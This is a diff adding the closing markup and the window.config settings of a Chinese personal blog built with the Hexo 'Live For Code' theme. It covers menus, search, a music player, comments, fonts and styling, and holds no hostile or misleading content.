+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+    
+    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+    <script type="text/javascript" src="/js/APlayer.min.js"></script>
+    <script type="text/javascript" src="/js/Meting.min.js"></script>
+    <script>
+        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+    </script>
+    <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+
+    <div class="wrap-right">
+    <div class="wrap-right-hide">
+         <div class="wrap-right-button favorites">
+            <div class="iconbox" switch="false">
+                <span class="iconfont icon-favorites"></span>
+            </div>
+            <span class="icontext">关注</span>
+         </div>
+        <div class="wrap-right-button search">
+            <div class="iconbox">
+                <span class="iconfont icon-search-menu"></span>
+            </div>
+            <span class="icontext">搜索</span>
+        </div>
+        <div class="wrap-right-button menu-button">
+            <div class="iconbox">
+                <span class="iconfont icon-menu"></span>
+            </div>
+            <span class="icontext">菜单</span>
+        </div>
+        <div class="wrap-right-button mode">
+            <div class="light">
+                <div class="iconbox">
+                    <span class="iconfont icon-daymode"></span>
+                </div>
+                <span class="icontext">浅色模式</span>
+            </div>
+            <div class="dark">
+                <div class="iconbox">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                </div>
+                <span class="icontext">深色模式</span>
+            </div>
+        </div>
+        <div class="wrap-right-button bottom">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">跳至底部</span>
+        </div>
+    </div>
+    <div class="wrap-right-show">
+        <div class="wrap-right-button set">
+            <div class="iconbox">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="wrap-right-button top">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+</div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "Dyinglight5",
+        GitHubRepositories : "Dyinglight5.github.io",
+
+        User             : "Dyinglight",
+        UserAvatar       : "/image/sidebar/RL02.jpg",
+        WebsiteStartDate : "2024-03-24",
+        Home             : "https://worstone.cn",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Live For Code",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : {
+            light : "/image/website/logo/logo.png",
+            dark  : "/image/website/logo/logo-dark.png"
+        },
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/elysia2.jpg",
+            
+                "/image/header/kiana1.png",
+            
+                "/image/header/home.jpeg",
+            
+        ],
+        HomeBannerText  : "",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.jpg",
+            
+                "/image/header/home.jpeg",
+            
+        ],
+
+        OtherBannerText : "",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "ctf start！",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "赞赏",
+                    icon   : "icon-heart-fill",
+                    href   : "/donate",
+                    type   : "donate",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "知乎",
+                        icon   : "icon-zhihu",
+                        href   : "https://zhihu.com/people/worstone-29",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "微博",
+                        icon   : "icon-weibo",
+                        href   : "https://weibo.com/u/5749847477",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "javascript:;",
+                        class  : "image",
+                        target : "_self",
+                        image  : "/image/sidebar/qq.jpg"
+                    },
+                
+                    {
+                        name   : "微信",
+                        icon   : "icon-wechat",
+                        href   : "javascript:;",
+                        class  : "",
+                        target : "_self",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/Dyinglight5",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2023 WorstOne. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.jpg",
+            wechat  : "/image/donate/wechatpay.jpg"
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Comment : {
+            switch : true,
+            type   : "Valine",
+        },
+
+        Waline : {
+            el              : ".comments-content",
+            serverURL       : "",
+            path            : window.location.pathname,
+            meta            : "['nick', 'mail', 'link']",
+            requiredMeta    : "['nick', 'mail']",
+            pageSize        : 10,
+            lang            : "zh-cn",
+            locale: {
+                admin       : "博主",
+                anonymous   : "匿名用户",
+                sofa        : "快来做第一个评论的人吧 ~",
+                placeholder : "你是我一生只会遇见一次的惊喜...",
+            },
+            dark            : "html[color-scheme='dark']",
+            search          : false,
+            pageview        : true,
+            comment         : true,
+            copyright       : false,
+        },
+
+        Valine : {
+            el             : ".comments-content",
+            appId          : "SVxN9Sk9mzBk4tCi9470dhDQ-gzGzoHsz",
+            appKey         : "BWGcit0aZ9zv8JeQWBB0eb2s",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            api      : "https://api.i-meto.com/meting/api",
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css",
+            waline           : "/css/waline.css",
+            walineCustom     : "/css/waline-custom.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js",
+            waline           : "/js/waline.mjs",
+            pageview         : "/js/pageview.mjs",
+            comment          : "/js/comment.mjs",
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "原神,启动！"
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
